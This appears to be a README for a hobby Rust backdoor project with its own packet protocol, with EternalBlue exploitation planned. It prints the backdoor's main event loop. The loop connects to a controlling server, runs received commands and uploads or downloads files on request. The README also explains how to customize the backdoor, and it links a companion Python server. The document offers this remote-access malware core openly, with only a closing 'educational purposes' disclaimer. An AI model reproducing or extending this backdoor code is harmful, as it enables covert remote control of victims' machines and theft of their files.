# Project Overview

## Introduction

This project stems from my interest in protocols and security, leading to the creation of a small backdoor and a proprietary protocol. The project is currently in development, with the backdoor's functionality completed and exploitation being implemented. I plan to use the EternalBlue exploit, and the entire backdoor and exploits are being developed exclusively in the Rust programming language.

**Note:** This project is still in progress.

## Features

- **Backdoor Functionality:** The backdoor's core functionality is complete and can be found in the `main.rs` file.
- **Exploits:** Exploits are being implemented in the `exploits.rs` file, currently featuring code for executing commands.
- **Dedicated Protocol:** The backdoor utilizes a dedicated protocol implemented in the `stprotocol.rs` file. It supports basic functionalities such as file upload, file download, and command execution.
- **Packet Structure:** The `structure.rs` file is dedicated to packet construction for the proprietary protocol, supporting packet conversion, serialization, and deserialization.

## Usage

### Backdoor

This project currently performs only basic functionalities.
However, if you wish to customize this project, please read the following guidelines. Below is an example code:

```
mod exploits;
mod stprotocol;
mod structure;

use exploits::{Exploits, Malware};
use std::thread;
use stprotocol::{Client, Session};
use structure::{Detector, Generator, StoneTransferProtocol, StructStone};

fn main() {
    let handle_server = thread::spawn(|| {
        event_loop(
            Session::new("127.0.0.1:6974".to_string()),
            StructStone::default(),
        )
    });

    handle_server
        .join()
        .expect("Connection to server is lost for unknown reasons. Backdoor terminated.");
}

fn event_loop(mut client: Session, mut packet: StructStone) {
    let mut exploit = Exploits::default();
    loop {
        // Loop for continuous communication with the server after creating a session

        packet = client.receiving(StructStone::default()); // Wait for the server's response after connection request

        println!("Server response type: {:?}", packet.get_type());

        match packet.get_type() {
            // Generate requests based on the server's response type
            StoneTransferProtocol::ExecuteCmd => {
                // If the type is ExecuteCmd
                client.exploit(exploit.command(packet));
            }
            StoneTransferProtocol::Download => {
                // If the type is Download
                client.download(packet);
            }
            StoneTransferProtocol::Upload => {
                // If the type is Upload
                client.upload(packet);
            }
            StoneTransferProtocol::Disconnect => {
                client.disconnect();
                break;
            }
            // If the server's response is Disconnect, terminate the connection

            _ => client.send(packet.get_stone()),
            // If the response type is not mentioned above, send a request similar to the server's response
        };
    }
}
```

1. **main.rs:** Contains the core functionalities of the backdoor.
2. **exploits.rs:** Manages the implementation of backdoor exploits. 
3. **stprotocol.rs:** Houses the backdoor's proprietary protocol, supporting features like file upload, file download, and command execution.
4. **structure.rs:** Provides packet configuration for the protocol, including packet conversion, serialization, and deserialization.
5. **Documentation of the module is still in progress. It will be completed soon. Please wait.**

### Customization

If you wish to customize this project, you can modify the code in the respective files: exploits.rs, stprotocol.rs, and structure.rs. Follow the provided comments for guidance.

Feel free to tailor the code to your specific requirements and functionalities. Remember to consider security implications and best practices when making changes.

Note: Ensure that your modifications comply with ethical standards and legal regulations. Unauthorized use of this code for malicious purposes is strictly prohibited.

## Python Server

This project includes a dedicated Python server. If you want the Python server, please visit [JustServer](https://github.com/3QNRpDwD/JustServer).

## How to Contribute

1. Fork this repository.
2. Create a new branch (`git checkout -b feature/new-feature`).
3. Make your changes (`git commit -am 'Add new feature'`).
4. Push to the branch (`git push origin feature/new-feature`).
5. Open a Pull Request.

## License

Open Source

**Disclaimer:** This project is for educational purposes only. Unauthorized use is strictly prohibited.
